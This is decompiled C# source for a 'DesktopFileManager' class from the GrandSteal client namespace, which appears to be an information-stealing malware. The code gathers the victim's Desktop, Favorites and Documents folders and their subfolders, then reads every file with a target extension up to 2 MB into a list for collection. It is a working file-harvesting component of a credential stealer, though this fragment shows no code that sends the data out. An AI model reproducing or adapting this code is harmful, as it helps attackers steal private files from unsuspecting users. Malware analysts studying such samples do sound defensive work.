using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000018 RID: 24
	public class DesktopFileManager : ICredentialsManager<DesktopFile>
	{
		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000088 RID: 136 RVA: 0x0000238F File Offset: 0x0000058F
		// (set) Token: 0x06000089 RID: 137 RVA: 0x00002397 File Offset: 0x00000597
		public IEnumerable<string> DesktopFileExtensions
		{
			get;
			set;
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x0600008A RID: 138 RVA: 0x000023A0 File Offset: 0x000005A0
		public IList<string> Directories
		{
			[CompilerGenerated]
			get
			{
				return this.<Directories>k__BackingField;
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00005D74 File Offset: 0x00003F74
		public DesktopFileManager()
		{
			this.<Directories>k__BackingField = new List<string>();
			try
			{
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
				this.Directories.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				for (int i = 0; i < directories.Length; i++)
				{
					string item = directories[i];
					this.Directories.Add(item);
				}
				directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
				for (int i = 0; i < directories.Length; i++)
				{
					string item2 = directories[i];
					this.Directories.Add(item2);
				}
				directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				for (int i = 0; i < directories.Length; i++)
				{
					string item3 = directories[i];
					this.Directories.Add(item3);
				}
			}
			catch (Exception arg_C6_0)
			{
				Console.WriteLine(arg_C6_0);
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00005E60 File Offset: 0x00004060
		public List<DesktopFile> GetAll()
		{
			List<DesktopFile> list = new List<DesktopFile>();
			if (this.DesktopFileExtensions == null)
			{
				return list;
			}
			foreach (string current in this.Directories)
			{
				try
				{
					foreach (string current2 in this.DesktopFileExtensions)
					{
						string[] files = Directory.GetFiles(current, current2, SearchOption.TopDirectoryOnly);
						for (int i = 0; i < files.Length; i++)
						{
							string fileName = files[i];
							try
							{
								FileInfo fileInfo = new FileInfo(fileName);
								if (fileInfo.Length <= 2097152L)
								{
									list.Add(new DesktopFile
									{
										FileData = File.ReadAllBytes(fileInfo.FullName),
										Filename = fileInfo.Name
									});
								}
							}
							catch (Exception arg)
							{
								Console.WriteLine("1:" + arg);
							}
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
	}
}
